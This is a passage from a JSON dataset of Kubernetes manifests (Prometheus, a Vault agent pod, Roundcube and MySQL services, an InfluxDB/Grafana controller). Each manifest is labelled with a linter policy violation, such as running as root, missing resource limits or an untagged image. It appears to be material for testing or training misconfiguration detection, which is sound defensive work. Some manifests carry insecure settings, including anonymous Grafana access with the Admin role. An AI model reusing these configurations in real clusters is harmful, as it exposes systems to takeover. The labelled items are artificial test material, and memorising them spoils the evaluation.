    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: prometheus\n    chart: prometheus-15.1.1\n    component: server\n    heritage: Helm\n    release: RELEASE-NAME\n  name: RELEASE-NAME-prometheus-server\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n      component: server\n      release: RELEASE-NAME\n  template:\n    metadata:\n      labels:\n        app: prometheus\n        chart: prometheus-15.1.1\n        component: server\n        heritage: Helm\n        release: RELEASE-NAME\n    spec:\n      containers:\n      - args:\n        - --volume-dir=/etc/config\n        - --webhook-url=http://127.0.0.1:9090/-/reload\n        image: jimmidyson/configmap-reload:v0.5.0\n        imagePullPolicy: IfNotPresent\n        name: prometheus-server-configmap-reload\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n          readOnly: true\n      - args:\n        - --storage.tsdb.retention.time=15d\n        - --config.file=/etc/config/prometheus.yml\n        - --storage.tsdb.path=/data\n        - --web.console.libraries=/etc/prometheus/console_libraries\n        - --web.console.templates=/etc/prometheus/consoles\n        - --web.enable-lifecycle\n        image: quay.io/prometheus/prometheus:v2.31.1\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/healthy\n            port: 9090\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 10\n        name: prometheus-server\n        ports:\n        - containerPort: 9090\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /-/ready\n            port: 9090\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 5\n          successThreshold: 1\n          timeoutSeconds: 4\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n        - mountPath: /data\n          name: storage-volume\n          subPath: ''\n      securityContext:\n        fsGroup: 65534\n        runAsGroup: 65534\n        runAsNonRoot: true\n        runAsUser: 65534\n      serviceAccountName: RELEASE-NAME-prometheus-server\n      volumes:\n      - configMap:\n          name: RELEASE-NAME-prometheus-server\n        name: config-volume\n      - name: storage-volume\n        persistentVolumeClaim:\n          claimName: RELEASE-NAME-prometheus-server\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prometheus-server-configmap-reload\" has memory limit 0"
  },
  {
    "id": "8599",
    "manifest_path": "data/manifests/the_stack_sample/sample_3218.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: vault-agent-example\n  namespace: vault\nspec:\n  serviceAccountName: vault-auth\n  volumes:\n  - configMap:\n      items:\n      - key: vault-agent-config.hcl\n        path: vault-agent-config.hcl\n      - key: consul-template-config.hcl\n        path: consul-template-config.hcl\n      name: example-vault-agent-config\n    name: config\n  - emptyDir: {}\n    name: shared-data\n  - emptyDir: {}\n    name: vault-token\n  initContainers:\n  - args:\n    - agent\n    - -config=/etc/vault/vault-agent-config.hcl\n    - -log-level=debug\n    env:\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    image: vault\n    name: vault-agent\n    volumeMounts:\n    - mountPath: /etc/vault\n      name: config\n    - name: vault-token\n      mountPath: /home/vault\n  containers:\n  - image: nginx\n    name: nginx-container\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: shared-data\n  - name: consul-template\n    image: hashicorp/consul-template:alpine\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: vault-token\n      mountPath: /home/vault\n    - name: config\n      mountPath: /etc/consul-template\n    - name: shared-data\n      mountPath: /etc/secrets\n    env:\n    - name: HOME\n      value: /home/vault\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    args:\n    - -config=/etc/consul-template/consul-template-config.hcl\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx-container\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8600",
    "manifest_path": "data/manifests/the_stack_sample/sample_3218.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: vault-agent-example\n  namespace: vault\nspec:\n  serviceAccountName: vault-auth\n  volumes:\n  - configMap:\n      items:\n      - key: vault-agent-config.hcl\n        path: vault-agent-config.hcl\n      - key: consul-template-config.hcl\n        path: consul-template-config.hcl\n      name: example-vault-agent-config\n    name: config\n  - emptyDir: {}\n    name: shared-data\n  - emptyDir: {}\n    name: vault-token\n  initContainers:\n  - args:\n    - agent\n    - -config=/etc/vault/vault-agent-config.hcl\n    - -log-level=debug\n    env:\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    image: vault\n    name: vault-agent\n    volumeMounts:\n    - mountPath: /etc/vault\n      name: config\n    - name: vault-token\n      mountPath: /home/vault\n  containers:\n  - image: nginx\n    name: nginx-container\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: shared-data\n  - name: consul-template\n    image: hashicorp/consul-template:alpine\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: vault-token\n      mountPath: /home/vault\n    - name: config\n      mountPath: /etc/consul-template\n    - name: shared-data\n      mountPath: /etc/secrets\n    env:\n    - name: HOME\n      value: /home/vault\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    args:\n    - -config=/etc/consul-template/consul-template-config.hcl\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"vault-agent\" is using an invalid container image, \"vault\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8601",
    "manifest_path": "data/manifests/the_stack_sample/sample_3218.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: vault-agent-example\n  namespace: vault\nspec:\n  serviceAccountName: vault-auth\n  volumes:\n  - configMap:\n      items:\n      - key: vault-agent-config.hcl\n        path: vault-agent-config.hcl\n      - key: consul-template-config.hcl\n        path: consul-template-config.hcl\n      name: example-vault-agent-config\n    name: config\n  - emptyDir: {}\n    name: shared-data\n  - emptyDir: {}\n    name: vault-token\n  initContainers:\n  - args:\n    - agent\n    - -config=/etc/vault/vault-agent-config.hcl\n    - -log-level=debug\n    env:\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    image: vault\n    name: vault-agent\n    volumeMounts:\n    - mountPath: /etc/vault\n      name: config\n    - name: vault-token\n      mountPath: /home/vault\n  containers:\n  - image: nginx\n    name: nginx-container\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: shared-data\n  - name: consul-template\n    image: hashicorp/consul-template:alpine\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: vault-token\n      mountPath: /home/vault\n    - name: config\n      mountPath: /etc/consul-template\n    - name: shared-data\n      mountPath: /etc/secrets\n    env:\n    - name: HOME\n      value: /home/vault\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    args:\n    - -config=/etc/consul-template/consul-template-config.hcl\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"consul-template\" does not have a read-only root file system"
  },
  {
    "id": "8602",
    "manifest_path": "data/manifests/the_stack_sample/sample_3218.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: vault-agent-example\n  namespace: vault\nspec:\n  serviceAccountName: vault-auth\n  volumes:\n  - configMap:\n      items:\n      - key: vault-agent-config.hcl\n        path: vault-agent-config.hcl\n      - key: consul-template-config.hcl\n        path: consul-template-config.hcl\n      name: example-vault-agent-config\n    name: config\n  - emptyDir: {}\n    name: shared-data\n  - emptyDir: {}\n    name: vault-token\n  initContainers:\n  - args:\n    - agent\n    - -config=/etc/vault/vault-agent-config.hcl\n    - -log-level=debug\n    env:\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    image: vault\n    name: vault-agent\n    volumeMounts:\n    - mountPath: /etc/vault\n      name: config\n    - name: vault-token\n      mountPath: /home/vault\n  containers:\n  - image: nginx\n    name: nginx-container\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: shared-data\n  - name: consul-template\n    image: hashicorp/consul-template:alpine\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: vault-token\n      mountPath: /home/vault\n    - name: config\n      mountPath: /etc/consul-template\n    - name: shared-data\n      mountPath: /etc/secrets\n    env:\n    - name: HOME\n      value: /home/vault\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    args:\n    - -config=/etc/consul-template/consul-template-config.hcl\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-container\" does not have a read-only root file system"
  },
  {
    "id": "8603",
    "manifest_path": "data/manifests/the_stack_sample/sample_3218.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: vault-agent-example\n  namespace: vault\nspec:\n  serviceAccountName: vault-auth\n  volumes:\n  - configMap:\n      items:\n      - key: vault-agent-config.hcl\n        path: vault-agent-config.hcl\n      - key: consul-template-config.hcl\n        path: consul-template-config.hcl\n      name: example-vault-agent-config\n    name: config\n  - emptyDir: {}\n    name: shared-data\n  - emptyDir: {}\n    name: vault-token\n  initContainers:\n  - args:\n    - agent\n    - -config=/etc/vault/vault-agent-config.hcl\n    - -log-level=debug\n    env:\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    image: vault\n    name: vault-agent\n    volumeMounts:\n    - mountPath: /etc/vault\n      name: config\n    - name: vault-token\n      mountPath: /home/vault\n  containers:\n  - image: nginx\n    name: nginx-container\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: shared-data\n  - name: consul-template\n    image: hashicorp/consul-template:alpine\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: vault-token\n      mountPath: /home/vault\n    - name: config\n      mountPath: /etc/consul-template\n    - name: shared-data\n      mountPath: /etc/secrets\n    env:\n    - name: HOME\n      value: /home/vault\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    args:\n    - -config=/etc/consul-template/consul-template-config.hcl\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"vault-agent\" does not have a read-only root file system"
  },
  {
    "id": "8604",
    "manifest_path": "data/manifests/the_stack_sample/sample_3218.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: vault-agent-example\n  namespace: vault\nspec:\n  serviceAccountName: vault-auth\n  volumes:\n  - configMap:\n      items:\n      - key: vault-agent-config.hcl\n        path: vault-agent-config.hcl\n      - key: consul-template-config.hcl\n        path: consul-template-config.hcl\n      name: example-vault-agent-config\n    name: config\n  - emptyDir: {}\n    name: shared-data\n  - emptyDir: {}\n    name: vault-token\n  initContainers:\n  - args:\n    - agent\n    - -config=/etc/vault/vault-agent-config.hcl\n    - -log-level=debug\n    env:\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    image: vault\n    name: vault-agent\n    volumeMounts:\n    - mountPath: /etc/vault\n      name: config\n    - name: vault-token\n      mountPath: /home/vault\n  containers:\n  - image: nginx\n    name: nginx-container\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: shared-data\n  - name: consul-template\n    image: hashicorp/consul-template:alpine\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: vault-token\n      mountPath: /home/vault\n    - name: config\n      mountPath: /etc/consul-template\n    - name: shared-data\n      mountPath: /etc/secrets\n    env:\n    - name: HOME\n      value: /home/vault\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    args:\n    - -config=/etc/consul-template/consul-template-config.hcl\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"vault-auth\" not found"
  },
  {
    "id": "8605",
    "manifest_path": "data/manifests/the_stack_sample/sample_3218.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: vault-agent-example\n  namespace: vault\nspec:\n  serviceAccountName: vault-auth\n  volumes:\n  - configMap:\n      items:\n      - key: vault-agent-config.hcl\n        path: vault-agent-config.hcl\n      - key: consul-template-config.hcl\n        path: consul-template-config.hcl\n      name: example-vault-agent-config\n    name: config\n  - emptyDir: {}\n    name: shared-data\n  - emptyDir: {}\n    name: vault-token\n  initContainers:\n  - args:\n    - agent\n    - -config=/etc/vault/vault-agent-config.hcl\n    - -log-level=debug\n    env:\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    image: vault\n    name: vault-agent\n    volumeMounts:\n    - mountPath: /etc/vault\n      name: config\n    - name: vault-token\n      mountPath: /home/vault\n  containers:\n  - image: nginx\n    name: nginx-container\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: shared-data\n  - name: consul-template\n    image: hashicorp/consul-template:alpine\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: vault-token\n      mountPath: /home/vault\n    - name: config\n      mountPath: /etc/consul-template\n    - name: shared-data\n      mountPath: /etc/secrets\n    env:\n    - name: HOME\n      value: /home/vault\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    args:\n    - -config=/etc/consul-template/consul-template-config.hcl\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"consul-template\" is not set to runAsNonRoot"
  },
  {
    "id": "8606",
    "manifest_path": "data/manifests/the_stack_sample/sample_3218.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: vault-agent-example\n  namespace: vault\nspec:\n  serviceAccountName: vault-auth\n  volumes:\n  - configMap:\n      items:\n      - key: vault-agent-config.hcl\n        path: vault-agent-config.hcl\n      - key: consul-template-config.hcl\n        path: consul-template-config.hcl\n      name: example-vault-agent-config\n    name: config\n  - emptyDir: {}\n    name: shared-data\n  - emptyDir: {}\n    name: vault-token\n  initContainers:\n  - args:\n    - agent\n    - -config=/etc/vault/vault-agent-config.hcl\n    - -log-level=debug\n    env:\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    image: vault\n    name: vault-agent\n    volumeMounts:\n    - mountPath: /etc/vault\n      name: config\n    - name: vault-token\n      mountPath: /home/vault\n  containers:\n  - image: nginx\n    name: nginx-container\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: shared-data\n  - name: consul-template\n    image: hashicorp/consul-template:alpine\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: vault-token\n      mountPath: /home/vault\n    - name: config\n      mountPath: /etc/consul-template\n    - name: shared-data\n      mountPath: /etc/secrets\n    env:\n    - name: HOME\n      value: /home/vault\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    args:\n    - -config=/etc/consul-template/consul-template-config.hcl\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-container\" is not set to runAsNonRoot"
  },
  {
    "id": "8607",
    "manifest_path": "data/manifests/the_stack_sample/sample_3218.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: vault-agent-example\n  namespace: vault\nspec:\n  serviceAccountName: vault-auth\n  volumes:\n  - configMap:\n      items:\n      - key: vault-agent-config.hcl\n        path: vault-agent-config.hcl\n      - key: consul-template-config.hcl\n        path: consul-template-config.hcl\n      name: example-vault-agent-config\n    name: config\n  - emptyDir: {}\n    name: shared-data\n  - emptyDir: {}\n    name: vault-token\n  initContainers:\n  - args:\n    - agent\n    - -config=/etc/vault/vault-agent-config.hcl\n    - -log-level=debug\n    env:\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    image: vault\n    name: vault-agent\n    volumeMounts:\n    - mountPath: /etc/vault\n      name: config\n    - name: vault-token\n      mountPath: /home/vault\n  containers:\n  - image: nginx\n    name: nginx-container\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: shared-data\n  - name: consul-template\n    image: hashicorp/consul-template:alpine\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: vault-token\n      mountPath: /home/vault\n    - name: config\n      mountPath: /etc/consul-template\n    - name: shared-data\n      mountPath: /etc/secrets\n    env:\n    - name: HOME\n      value: /home/vault\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    args:\n    - -config=/etc/consul-template/consul-template-config.hcl\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"vault-agent\" is not set to runAsNonRoot"
  },
  {
    "id": "8608",
    "manifest_path": "data/manifests/the_stack_sample/sample_3218.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: vault-agent-example\n  namespace: vault\nspec:\n  serviceAccountName: vault-auth\n  volumes:\n  - configMap:\n      items:\n      - key: vault-agent-config.hcl\n        path: vault-agent-config.hcl\n      - key: consul-template-config.hcl\n        path: consul-template-config.hcl\n      name: example-vault-agent-config\n    name: config\n  - emptyDir: {}\n    name: shared-data\n  - emptyDir: {}\n    name: vault-token\n  initContainers:\n  - args:\n    - agent\n    - -config=/etc/vault/vault-agent-config.hcl\n    - -log-level=debug\n    env:\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    image: vault\n    name: vault-agent\n    volumeMounts:\n    - mountPath: /etc/vault\n      name: config\n    - name: vault-token\n      mountPath: /home/vault\n  containers:\n  - image: nginx\n    name: nginx-container\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: shared-data\n  - name: consul-template\n    image: hashicorp/consul-template:alpine\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: vault-token\n      mountPath: /home/vault\n    - name: config\n      mountPath: /etc/consul-template\n    - name: shared-data\n      mountPath: /etc/secrets\n    env:\n    - name: HOME\n      value: /home/vault\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    args:\n    - -config=/etc/consul-template/consul-template-config.hcl\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"consul-template\" has cpu request 0"
  },
  {
    "id": "8609",
    "manifest_path": "data/manifests/the_stack_sample/sample_3218.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: vault-agent-example\n  namespace: vault\nspec:\n  serviceAccountName: vault-auth\n  volumes:\n  - configMap:\n      items:\n      - key: vault-agent-config.hcl\n        path: vault-agent-config.hcl\n      - key: consul-template-config.hcl\n        path: consul-template-config.hcl\n      name: example-vault-agent-config\n    name: config\n  - emptyDir: {}\n    name: shared-data\n  - emptyDir: {}\n    name: vault-token\n  initContainers:\n  - args:\n    - agent\n    - -config=/etc/vault/vault-agent-config.hcl\n    - -log-level=debug\n    env:\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    image: vault\n    name: vault-agent\n    volumeMounts:\n    - mountPath: /etc/vault\n      name: config\n    - name: vault-token\n      mountPath: /home/vault\n  containers:\n  - image: nginx\n    name: nginx-container\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: shared-data\n  - name: consul-template\n    image: hashicorp/consul-template:alpine\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: vault-token\n      mountPath: /home/vault\n    - name: config\n      mountPath: /etc/consul-template\n    - name: shared-data\n      mountPath: /etc/secrets\n    env:\n    - name: HOME\n      value: /home/vault\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    args:\n    - -config=/etc/consul-template/consul-template-config.hcl\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-container\" has cpu request 0"
  },
  {
    "id": "8610",
    "manifest_path": "data/manifests/the_stack_sample/sample_3218.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: vault-agent-example\n  namespace: vault\nspec:\n  serviceAccountName: vault-auth\n  volumes:\n  - configMap:\n      items:\n      - key: vault-agent-config.hcl\n        path: vault-agent-config.hcl\n      - key: consul-template-config.hcl\n        path: consul-template-config.hcl\n      name: example-vault-agent-config\n    name: config\n  - emptyDir: {}\n    name: shared-data\n  - emptyDir: {}\n    name: vault-token\n  initContainers:\n  - args:\n    - agent\n    - -config=/etc/vault/vault-agent-config.hcl\n    - -log-level=debug\n    env:\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    image: vault\n    name: vault-agent\n    volumeMounts:\n    - mountPath: /etc/vault\n      name: config\n    - name: vault-token\n      mountPath: /home/vault\n  containers:\n  - image: nginx\n    name: nginx-container\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: shared-data\n  - name: consul-template\n    image: hashicorp/consul-template:alpine\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: vault-token\n      mountPath: /home/vault\n    - name: config\n      mountPath: /etc/consul-template\n    - name: shared-data\n      mountPath: /etc/secrets\n    env:\n    - name: HOME\n      value: /home/vault\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    args:\n    - -config=/etc/consul-template/consul-template-config.hcl\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"vault-agent\" has cpu request 0"
  },
  {
    "id": "8611",
    "manifest_path": "data/manifests/the_stack_sample/sample_3218.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: vault-agent-example\n  namespace: vault\nspec:\n  serviceAccountName: vault-auth\n  volumes:\n  - configMap:\n      items:\n      - key: vault-agent-config.hcl\n        path: vault-agent-config.hcl\n      - key: consul-template-config.hcl\n        path: consul-template-config.hcl\n      name: example-vault-agent-config\n    name: config\n  - emptyDir: {}\n    name: shared-data\n  - emptyDir: {}\n    name: vault-token\n  initContainers:\n  - args:\n    - agent\n    - -config=/etc/vault/vault-agent-config.hcl\n    - -log-level=debug\n    env:\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    image: vault\n    name: vault-agent\n    volumeMounts:\n    - mountPath: /etc/vault\n      name: config\n    - name: vault-token\n      mountPath: /home/vault\n  containers:\n  - image: nginx\n    name: nginx-container\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: shared-data\n  - name: consul-template\n    image: hashicorp/consul-template:alpine\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: vault-token\n      mountPath: /home/vault\n    - name: config\n      mountPath: /etc/consul-template\n    - name: shared-data\n      mountPath: /etc/secrets\n    env:\n    - name: HOME\n      value: /home/vault\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    args:\n    - -config=/etc/consul-template/consul-template-config.hcl\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"consul-template\" has memory limit 0"
  },
  {
    "id": "8612",
    "manifest_path": "data/manifests/the_stack_sample/sample_3218.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: vault-agent-example\n  namespace: vault\nspec:\n  serviceAccountName: vault-auth\n  volumes:\n  - configMap:\n      items:\n      - key: vault-agent-config.hcl\n        path: vault-agent-config.hcl\n      - key: consul-template-config.hcl\n        path: consul-template-config.hcl\n      name: example-vault-agent-config\n    name: config\n  - emptyDir: {}\n    name: shared-data\n  - emptyDir: {}\n    name: vault-token\n  initContainers:\n  - args:\n    - agent\n    - -config=/etc/vault/vault-agent-config.hcl\n    - -log-level=debug\n    env:\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    image: vault\n    name: vault-agent\n    volumeMounts:\n    - mountPath: /etc/vault\n      name: config\n    - name: vault-token\n      mountPath: /home/vault\n  containers:\n  - image: nginx\n    name: nginx-container\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: shared-data\n  - name: consul-template\n    image: hashicorp/consul-template:alpine\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: vault-token\n      mountPath: /home/vault\n    - name: config\n      mountPath: /etc/consul-template\n    - name: shared-data\n      mountPath: /etc/secrets\n    env:\n    - name: HOME\n      value: /home/vault\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    args:\n    - -config=/etc/consul-template/consul-template-config.hcl\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-container\" has memory limit 0"
  },
  {
    "id": "8613",
    "manifest_path": "data/manifests/the_stack_sample/sample_3218.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: vault-agent-example\n  namespace: vault\nspec:\n  serviceAccountName: vault-auth\n  volumes:\n  - configMap:\n      items:\n      - key: vault-agent-config.hcl\n        path: vault-agent-config.hcl\n      - key: consul-template-config.hcl\n        path: consul-template-config.hcl\n      name: example-vault-agent-config\n    name: config\n  - emptyDir: {}\n    name: shared-data\n  - emptyDir: {}\n    name: vault-token\n  initContainers:\n  - args:\n    - agent\n    - -config=/etc/vault/vault-agent-config.hcl\n    - -log-level=debug\n    env:\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    image: vault\n    name: vault-agent\n    volumeMounts:\n    - mountPath: /etc/vault\n      name: config\n    - name: vault-token\n      mountPath: /home/vault\n  containers:\n  - image: nginx\n    name: nginx-container\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: shared-data\n  - name: consul-template\n    image: hashicorp/consul-template:alpine\n    imagePullPolicy: Always\n    volumeMounts:\n    - name: vault-token\n      mountPath: /home/vault\n    - name: config\n      mountPath: /etc/consul-template\n    - name: shared-data\n      mountPath: /etc/secrets\n    env:\n    - name: HOME\n      value: /home/vault\n    - name: VAULT_ADDR\n      value: http://vault:8200\n    args:\n    - -config=/etc/consul-template/consul-template-config.hcl\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"vault-agent\" has memory limit 0"
  },
  {
    "id": "8614",
    "manifest_path": "data/manifests/the_stack_sample/sample_3220.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: roundcube\nspec:\n  selector:\n    app: roundcube\n  clusterIP: None\n  ports:\n  - name: web\n    port: 80\n    targetPort: 80\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:roundcube])"
  },
  {
    "id": "8615",
    "manifest_path": "data/manifests/the_stack_sample/sample_3221.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    name: mysql\n  name: mysql\nspec:\n  ports:\n  - port: 3306\n  selector:\n    name: mysql\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:mysql])"
  },
  {
    "id": "8616",
    "manifest_path": "data/manifests/the_stack_sample/sample_3223.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: monitoring-influxdb-grafana-v4\n  namespace: kube-system\n  labels:\n    k8s-app: influxGrafana\n    version: v4\n    kubernetes.io/cluster-service: 'true'\nspec:\n  replicas: 1\n  selector:\n    k8s-app: influxGrafana\n    version: v4\n  template:\n    metadata:\n      labels:\n        k8s-app: influxGrafana\n        version: v4\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - image: hub.docker.vpclub.cn/vpclub_containers/heapster_influxdb:v0.7\n        name: influxdb\n        resources:\n          limits:\n            cpu: 100m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 500Mi\n        ports:\n        - containerPort: 8083\n        - containerPort: 8086\n        volumeMounts:\n        - name: influxdb-persistent-storage\n          mountPath: /data\n      - image: hub.docker.vpclub.cn/vpclub_containers/heapster_grafana:v2.6.0-2\n        name: grafana\n        env:\n        - name: INFLUXDB_SERVICE_URL\n          value: http://monitoring-influxdb:8086\n        - name: GF_AUTH_BASIC_ENABLED\n          value: 'false'\n        - name: GF_AUTH_ANONYMOUS_ENABLED\n          value: 'true'\n        - name: GF_AUTH_ANONYMOUS_ORG_ROLE\n          value: Admin\n        - name: GF_SERVER_ROOT_URL\n          value: /api/v1/proxy/namespaces/kube-system/services/monitoring-grafana/\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: grafana-persistent-storage\n          mountPath: /var\n      volumes:\n      - name: influxdb-persistent-storage\n        emptyDir: {}\n      - name: grafana-persistent-storage\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"grafana\" does not have a read-only root file system"
  },
  {
    "id": "8617",
    "manifest_path": "data/manifests/the_stack_sample/sample_3223.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: monitoring-influxdb-grafana-v4\n  namespace: kube-system\n  labels:\n    k8s-app: influxGrafana\n    version: v4\n    kubernetes.io/cluster-service: 'true'\nspec:\n  replicas: 1\n  selector:\n    k8s-app: influxGrafana\n    version: v4\n  template:\n    metadata:\n      labels:\n        k8s-app: influxGrafana\n        version: v4\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - image: hub.docker.vpclub.cn/vpclub_containers/heapster_influxdb:v0.7\n        name: influxdb\n        resources:\n          limits:\n            cpu: 100m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 500Mi\n        ports:\n        - containerPort: 8083\n        - containerPort: 8086\n        volumeMounts:\n        - name: influxdb-persistent-storage\n          mountPath: /data\n      - image: hub.docker.vpclub.cn/vpclub_containers/heapster_grafana:v2.6.0-2\n        name: grafana\n        env:\n        - name: INFLUXDB_SERVICE_URL\n          value: http://monitoring-influxdb:8086\n        - name: GF_AUTH_BASIC_ENABLED\n          value: 'false'\n        - name: GF_AUTH_ANONYMOUS_ENABLED\n          value: 'true'\n        - name: GF_AUTH_ANONYMOUS_ORG_ROLE\n          value: Admin\n        - name: GF_SERVER_ROOT_URL\n          value: /api/v1/proxy/namespaces/kube-system/services/monitoring-grafana/\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: grafana-persistent-storage\n          mountPath: /var\n      volumes:\n      - name: influxdb-persistent-storage\n        emptyDir: {}\n      